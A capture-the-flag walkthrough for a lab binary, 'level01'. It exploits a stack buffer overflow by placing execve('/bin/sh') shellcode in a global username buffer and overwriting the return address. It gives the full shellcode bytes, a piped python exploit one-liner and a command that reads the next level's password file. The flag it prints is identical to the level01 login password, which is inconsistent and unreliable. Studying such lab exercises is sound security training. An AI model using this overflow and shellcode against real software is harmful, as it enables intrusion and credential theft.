# Walkthrough

## 1. Download the binary

```bash
scp -P 2222 level01@localhost:~/level01 .
# Password: PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

## 2. Analyze with Ghidra

Open the binary in Ghidra and examine the `main`, `verify_user_name`, and `verify_user_pass` functions.

## 3. Identify the vulnerabilities

**Logic Bug:**
```c
if ((result == 0) || (result != 0)) {
    puts("nope, incorrect password...\n");
    return 1;
}
```
This condition is always true - you can never authenticate legitimately!

**Buffer Overflow:**
```c
char password[64];
fgets(password, 100, stdin);  // Reads 100 bytes into 64-byte buffer!
```

## 4. Find key addresses

- Global buffer `a_user_name` is at `0x0804a040`
- Password buffer is 64 bytes at `[ESP + 0x1c]`
- Return address is at offset 80 from the password buffer

## 5. Craft the exploit

**Strategy:**
1. Put shellcode in the username (stored at `0x0804a040`)
2. Overflow the password buffer to overwrite the return address
3. Jump to `0x0804a047` (after "dat_wil" prefix in username)

**Shellcode:** Standard execve("/bin/sh") - 21 bytes
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

## 6. Connect to the VM

```bash
ssh level01@localhost -p 2222
# Password: PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

## 7. Execute the exploit

```bash
(python -c 'print "dat_wil" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'; python -c 'print "A"*80 + "\x47\xa0\x04\x08"'; cat) | ./level01
```

**Breakdown:**
- `"dat_wil"` - Pass username verification
- `+ shellcode` - Inject shellcode at `0x0804a047`
- `"A"*80` - Fill password buffer and padding
- `"\x47\xa0\x04\x08"` - Overwrite return address with `0x0804a047` (little-endian)
- `cat` - Keep stdin open for shell interaction

## 8. Get the flag

```bash
cat /home/users/level02/.pass
```

## 9. Flag

```
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
